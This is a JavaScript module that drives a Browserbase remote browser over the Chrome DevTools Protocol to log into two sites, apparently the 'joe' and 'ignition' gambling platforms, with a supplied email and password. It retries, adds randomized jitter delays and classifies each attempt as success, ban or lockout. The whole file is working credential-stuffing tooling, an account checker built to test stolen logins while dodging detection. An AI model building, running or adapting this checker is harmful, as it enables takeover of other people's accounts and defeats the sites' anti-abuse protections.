/**
 * Joe Ignite CDP driver — drives a single Browserbase session via its
 * connectUrl WebSocket. Opens two tabs (joe + ignition), types credentials,
 * submits the form, and evaluates the outcome from the page URL + text.
 *
 * This is the in-browser equivalent of what the Stagehand Python script did
 * server-side. Browserbase's connectUrl is a raw CDP endpoint so we can do
 * this without any extra backend.
 */
import { JOE_IGNITE_CONFIG, jitter, classifyOutcome } from '@/lib/joeIgniteConfig';

class CDPClient {
  constructor(ws) {
    this.ws = ws;
    this.nextId = 1;
    this.pending = new Map();
    this.sessionTargets = new Map(); // targetId -> sessionId
    ws.addEventListener('message', (e) => {
      let msg;
      try { msg = JSON.parse(e.data); } catch { return; }
      if (msg.id && this.pending.has(msg.id)) {
        const { resolve, reject } = this.pending.get(msg.id);
        this.pending.delete(msg.id);
        if (msg.error) reject(new Error(msg.error.message));
        else resolve(msg.result);
      }
    });
  }

  send(method, params = {}, sessionId) {
    const id = this.nextId++;
    return new Promise((resolve, reject) => {
      this.pending.set(id, { resolve, reject });
      const payload = { id, method, params };
      if (sessionId) payload.sessionId = sessionId;
      this.ws.send(JSON.stringify(payload));
      setTimeout(() => {
        if (this.pending.has(id)) {
          this.pending.delete(id);
          reject(new Error(`CDP timeout: ${method}`));
        }
      }, 30000);
    });
  }

  close() { try { this.ws.close(); } catch {} }
}

function openCDP(connectUrl) {
  return new Promise((resolve, reject) => {
    const ws = new WebSocket(connectUrl);
    const timeout = setTimeout(() => reject(new Error('CDP connect timeout')), 15000);
    ws.onopen = () => { clearTimeout(timeout); resolve(new CDPClient(ws)); };
    ws.onerror = () => { clearTimeout(timeout); reject(new Error('CDP connect failed')); };
  });
}

/** Attach to a target and return the CDP sessionId for per-tab commands */
async function attachToTarget(cdp, targetId) {
  const { sessionId } = await cdp.send('Target.attachToTarget', { targetId, flatten: true });
  return sessionId;
}

/** Get the first existing page target, or create one */
async function getOrCreatePageTarget(cdp) {
  const { targetInfos } = await cdp.send('Target.getTargets');
  const page = targetInfos.find((t) => t.type === 'page');
  if (page) return page.targetId;
  const { targetId } = await cdp.send('Target.createTarget', { url: 'about:blank' });
  return targetId;
}

async function navigate(cdp, sessionId, url) {
  await cdp.send('Page.enable', {}, sessionId);
  await cdp.send('Page.navigate', { url }, sessionId);
  // Wait for load
  await new Promise((resolve) => {
    const handler = (e) => {
      try {
        const msg = JSON.parse(e.data);
        if (msg.sessionId === sessionId && msg.method === 'Page.loadEventFired') {
          cdp.ws.removeEventListener('message', handler);
          resolve();
        }
      } catch {}
    };
    cdp.ws.addEventListener('message', handler);
    setTimeout(() => { cdp.ws.removeEventListener('message', handler); resolve(); }, 20000);
  });
}

async function evaluate(cdp, sessionId, expression) {
  const { result } = await cdp.send('Runtime.evaluate', {
    expression, returnByValue: true, awaitPromise: true,
  }, sessionId);
  return result?.value;
}

async function dismissCookieBanner(cdp, sessionId) {
  const selectors = JOE_IGNITE_CONFIG.COOKIE_SELECTORS;
  const expr = `(() => {
    const sels = ${JSON.stringify(selectors)};
    for (const s of sels) {
      const el = document.querySelector(s);
      if (el) { el.click(); return true; }
    }
    return false;
  })()`;
  try { await evaluate(cdp, sessionId, expr); } catch {}
  await jitter(300, 600);
}

async function fillAndSubmit(cdp, sessionId, selectors, email, password, overwrite) {
  const expr = `(() => {
    const setVal = (sel, val) => {
      const el = document.querySelector(sel);
      if (!el) return false;
      const nativeSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
      el.focus();
      if (${overwrite}) { el.select?.(); }
      nativeSetter.call(el, val);
      el.dispatchEvent(new Event('input',  { bubbles: true }));
      el.dispatchEvent(new Event('change', { bubbles: true }));
      return true;
    };
    const u = setVal(${JSON.stringify(selectors.username)}, ${JSON.stringify(email)});
    const p = setVal(${JSON.stringify(selectors.password)}, ${JSON.stringify(password)});
    return { u, p };
  })()`;
  await evaluate(cdp, sessionId, expr);
  await jitter(60, 140);

  const submitExpr = `(() => {
    const btn = document.querySelector(${JSON.stringify(selectors.submit)});
    if (!btn) return false;
    btn.click();
    return true;
  })()`;
  await evaluate(cdp, sessionId, submitExpr);
}

async function readPageState(cdp, sessionId) {
  const expr = `({ url: location.href, text: (document.body && document.body.innerText || '').slice(0, 8000) })`;
  return (await evaluate(cdp, sessionId, expr)) || { url: '', text: '' };
}

/**
 * Run a single credential through one BB session with two tabs.
 * onProgress({ attempt, phase, joe, ignition }) called on each step.
 */
export async function runCredentialInSession({ connectUrl, email, password, onProgress }) {
  const cdp = await openCDP(connectUrl);
  const results = { joe: null, ignition: null };
  let attemptNum = 0;

  try {
    // ---- set up two tabs ----
    const joeTargetId = await getOrCreatePageTarget(cdp);
    const { targetId: ignTargetId } = await cdp.send('Target.createTarget', { url: 'about:blank' });
    const joeSession = await attachToTarget(cdp, joeTargetId);
    const ignSession = await attachToTarget(cdp, ignTargetId);

    const sites = [
      { key: 'joe',      session: joeSession, cfg: JOE_IGNITE_CONFIG.SITES.joe },
      { key: 'ignition', session: ignSession, cfg: JOE_IGNITE_CONFIG.SITES.ignition },
    ];

    const testSite = async (site, attempt) => {
      try {
        if (attempt === 1) {
          await navigate(cdp, site.session, site.cfg.url);
          await dismissCookieBanner(cdp, site.session);
          await jitter(300, 600);
        }
        await fillAndSubmit(cdp, site.session, site.cfg.selectors, email, password, attempt > 1);
        await jitter(1500, 2500);
        const state = await readPageState(cdp, site.session);
        return classifyOutcome(state);
      } catch (err) {
        return 'ERROR';
      }
    };

    for (attemptNum = 1; attemptNum <= JOE_IGNITE_CONFIG.MAX_ATTEMPTS; attemptNum++) {
      onProgress?.({ attempt: attemptNum, phase: 'running' });
      if (JOE_IGNITE_CONFIG.USE_PARALLEL_SITES) {
        const [joeRes, ignRes] = await Promise.all([testSite(sites[0], attemptNum), testSite(sites[1], attemptNum)]);
        results.joe = joeRes; results.ignition = ignRes;
      } else {
        results.joe = await testSite(sites[0], attemptNum);
        results.ignition = await testSite(sites[1], attemptNum);
      }
      onProgress?.({ attempt: attemptNum, phase: 'attempt-done', joe: results.joe, ignition: results.ignition });
      const hitTerminal = ['SUCCESS', 'PERM_BAN', 'TEMP_LOCK'].some((o) => results.joe === o || results.ignition === o);
      if (hitTerminal) break;
      if (attemptNum < JOE_IGNITE_CONFIG.MAX_ATTEMPTS) await jitter(2000, 3000);
    }
  } finally {
    cdp.close();
  }

  return { results, attempts: attemptNum };
}